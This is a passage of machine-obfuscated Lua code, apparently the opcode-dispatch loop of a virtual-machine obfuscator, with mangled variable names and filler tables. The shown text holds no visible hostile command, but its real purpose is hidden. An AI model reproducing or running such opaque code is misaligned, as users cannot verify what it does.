IIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4V")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ltS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5z")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("uvg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("ksja")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("GG")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("OFQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("J1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Oz1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("zqXr")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MP")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sOH")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VF")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("4Km")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("iN2i")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{463;841;180;572};}]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("CgE")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0Ad")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("jQvf")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hQ")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0Np")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7s")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("K1o")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1U8a")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0Y")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sxv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dz")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("35g")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("UfjM")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vx")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("dVZ")]~=0);ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BCY")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eY")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("KY")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("hbj")]]*ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kqkz")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("PcaZlZQ6LJd792JjKeO4HEkNWgynH3ytb30CSlAZe")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("pdsn3WyLSfjxbl2yceCDzRlT5gbgBzOYZnnguJn")then local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2vH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("TGAx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("uB")];ajefa_IlIIIlIIIIlIIlllI=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Bcb")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IlIIIlIIIIlIIlllI;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IlIIIlIIIIlIIlllI[ajefa_lllIIlIllIlIllllIIlIIlll[#("6ekB")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("TN")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1G")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{742;542;708;511};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("b7cL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{574;224;530;187};}]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ALW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZJ")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("oTW")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3I87")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dS")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("atR")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Cz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("YPW")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Dx")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Rad")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("06krjP2PKuiuyM4J1JrWUqktCvHX8VcD1ZNDG4Jq")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#{{908;248;597;213};{678;191;12;610};}]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]()else local ajefa_lIIIIIlIllIlllllllIIll=ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("Zhc")]];local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll={};ajefa_IlIIIlIIIIlIIlllI=ajefa_lIIllIIIIIllIlIlllllII({},{__index=function(ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll];return ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]];end,__newindex=function(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll]ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]]=ajefa_IlIIIlIllIlIlllIlIlIllll;end;});for ajefa_IlIIllIIIl=1,ajefa_lllIIlIllIlIllllIIlIIlll[#("BujH")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if ajefa_lllIIlIllIlIllllIIlIIlll[#("S")]==82 then ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll[#("4fb")]};else ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]};end;ajefa_IIIlIlIlIlIllIIllIIIIlII[#ajefa_IIIlIlIlIlIllIIllIIIIlII+1]=ajefa_IIIlIllIllllIIllIlllIIll;end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Fe")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lIIIIIlIllIlllllllIIll,ajefa_IlIIIlIIIIlIIlllI,ajefa_IlIIllIIIl);end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("vHfpsAntOoVrC1JV1ZYheRZsQEI8Bd79aHzUfdj5tE")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("sN")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Pqx")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("thkv")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mg")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("pOm")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("XL")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("OCN")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("T1")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{143;905;634;733};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2DEQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1p")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("Nq8O")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("lRU")];end;elseif ajefa_IIIlIllIllllIIllIlllIIll>#("Gqlz8dSOfVikPRXKY1o2KrVq4DZQXQ3YKxsbEfK5Tz1")then local ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HzS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("WKII")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("UA")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("R5M")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("92")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sLK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("XcIx")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("lvT")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{831;894;911;818};"1 + 1 = 111";"1 + 1 = 111";{625;46;738;252};}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Wa")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sys")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{567;698;659;429};{944;912;795;494};}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("n9")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{985;225;495;371};"1 + 1 = 111";{848;864;439;748};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Y3ZQ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("BH")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Eb9")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("JDvZ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uB")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3I4")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("MKt7")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("10")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("NZs")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("1XLe")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("JpR")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("qJYr")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("JM")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("bsq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{918;451;141;223};"1 + 1 = 111";{3;18;583;125};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("KpWP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VV")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("2Pk")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("as")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("yQL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1b")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{458;769;879;403};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("qxcG")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("4a")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("5ub")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("2V28")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("kG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("RUK")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("tQTV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0A")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cE8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("C7pW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tu")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{346;128;355;93};{842;852;707;751};{112;634;258;686};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("MVZt")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{232;70;789;658};}]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("oPG")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("TL")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Db")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ygB")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pfH5")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("j8")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("oqJ")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("zC")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ocz")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fB")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("qGx")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIl